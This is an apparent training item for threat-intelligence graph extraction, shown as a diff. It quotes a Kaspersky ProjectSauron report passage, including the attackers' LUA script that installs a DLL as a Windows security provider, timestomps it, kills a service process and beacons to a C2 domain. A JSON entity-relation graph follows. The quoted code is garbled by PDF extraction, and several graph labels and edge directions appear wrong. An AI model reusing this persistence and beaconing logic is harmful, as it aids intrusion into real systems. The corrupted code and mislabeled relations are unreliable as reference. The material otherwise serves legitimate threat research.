@@ -1,0 +1,112 @@
+
+
+
+Sentence : LUA
+The use of a LUA interpreter allowed the attackers to operate with flexibility by writing a simple LUA script
+for a target machine. The original LUA interpreter was modified by the attackers to support Unicode (UTF
+16) string encoding.
+Below is an example of such a script used to install ProjectSauron modules onto the system:
+domain = "bikessport[.]com"
+dllName = "msprtssp.dll"
+install_zeta2 = function ()
+windir = os.getenv("WINDIR")
+execStr = string.format("put2 zeta2dll \" %s \ SYSTEM32 \ %s \" ", windir, dllName)
+res = w.exec2str(execStr)
+if string.find(res, "kb/sec") == nil then
+w.printf("put2 failed \n %s \n ", res)
+return false
+end
+execStr = string.format("nslu gc3220." .. domain)
+w.exec2str(execStr)
+regwrite = false
+regStr = w.exec2str("regedit -r \" HKLM \ System \ CurrentControlSet \ Control \ SecurityProviders \" | grep -i
+SecurityProviders")
+w.printf("regStr %s \n ", regStr)
+for k,v in string.gmatch(regStr, " \" (%w+) \" = \" ([%w,%. ]) \" ") do*
+w.printf("k=%s, v= %s \n ", k, v)
+if string.lower(k) == "securityproviders" then
+if string.len(v)      - 0 then
+value = string.format("%s, %s", v, dllName)
+else
+value = string.format("%s", dllName)
+end
+if not string.find(v, dllName, 1, true) then
+stdIn = string.format("Windows Registry Editor Version
+5.00 \n\n [HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ SecurityProviders] \n\" SecurityProviders \" = \" %s **
+" ", value)
+w.printf(" \n\n stdIn \n %s \n ", stdIn)
+out = w.exec2str("regedit -i", stdIn)
+w.printf(" \n\n out \n %s \n ", out)
+else
+w.printf("Found dllName \n ")
+end
+regwrite = true
+end
+end
+if regwrite == true then
+execStr = string.format("ftime -c \" %s \ SYSTEM32 \ ntdll.dll \" \" %s \ SYSTEM32 \ %s \" ", windir, windir, dllName)
+res = w.exec2str(execStr)
+w.printf("%s \n ", res)
+execStr = string.format("nslu gc3221." .. domain)
+w.exec2str(execStr)
+For any inquiries, contact intelreports@kaspersky.com Page 13 of 22
+The ProjectSauron APT
+end
+return regwrite
+end
+z2res = install_zeta2()
+if not z2res then
+w.printf("Installation failed \n ")
+execStr = string.format("nslu xxc3222." .. domain)
+w.exec2str(execStr)
+else
+str = w.exec2str("plist -b | grep netsvcs")
+pid = string.match(str, "%w (%d+) %w")
+w.debugf("Pid %d \n ", pid)
+w.exec2str(string.format("pkill %d", pid))
+w.printf("Installation done \n ")
+execStr = string.format("nslu ooc3222." .. domain)
+w.exec2str(execStr)
+end
+More LUA examples are shown in ‘Technical Analysis’.
+For any inquiries, contact intelreports@kaspersky.com Page 14 of 22
+The ProjectSauron APT
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "LUA interpreter", "type" : "APPS"},
+        {"id": 2, "description": "Unicode (UTF-16) string encoding", "type" : "TAMP"},
+        {"id": 3, "description": "ProjectSauron modules", "type" : "DOCF"},
+        {"id": 4, "description": "bikessport[.]com", "type" : "CCSH"},
+        {"id": 5, "description": "msprtssp.dll", "type" : "EXEF"},
+        {"id": 6, "description": "WINDIR environment variable", "type" : "REGI"},
+        {"id": 7, "description": "SYSTEM32 directory", "type" : "SYSP"},
+        {"id": 8, "description": "put2 command", "type" : "EXEF"},
+        {"id": 9, "description": "nslu gc3220. bikessport[.]com", "type" : "URLS"},
+        {"id": 10, "description": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders registry key", "type" : "REGI"},
+        {"id": 11, "description": "regedit command", "type" : "EXEF"},
+        {"id": 12, "description": "ftime -c command", "type" : "EXEF"},
+        {"id": 13, "description": "nslu gc3221. bikessport[.]com", "type" : "URLS"},
+        {"id": 14, "description": "ntdll.dll", "type" : "EXEF"},
+        {"id": 15, "description": "nslu xxc3222. bikessport[.]com", "type" : "URLS"},
+        {"id": 16, "description": "plist -b command", "type" : "EXEF"},
+        {"id": 17, "description": "pkill command", "type" : "EXEF"},
+        {"id": 18, "description": "nslu ooc3222. bikessport[.]com", "type" : "URLS"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "modified to support"},
+        {"source": 1, "target": 3, "rel_name" : "used to install"},
+        {"source": 1, "target": 4, "rel_name" : "uses domain from"},
+        {"source": 1, "target": 5, "rel_name" : "installs"},
+        {"source": 1, "target": 6, "rel_name" : "queries"},
+        {"source": 1, "target": 7, "rel_name" : "accesses directory in"},
+        {"source": 1, "target": 8, "rel_name" : "uses command"},
+        {"source": 9, "target": 4, "rel_name" : "sends request to"},
+        {"source": 10, "target": 5, "rel_name" : "adds value in"},
+        {"source": 11, "target": 10, "rel_name" : "modifies registry with"},
+        {"source": 12, "target": 14, "rel_name" : "copies file to"},
+        {"source": 13, "target": 4, "rel_name" : "sends request to"},
+        {"source": 15, "target": 4, "rel_name" : "sends request to"},
+        {"source": 16, "target": 17, "rel_name" : "identifies process and kills with"}
+    ]
+}
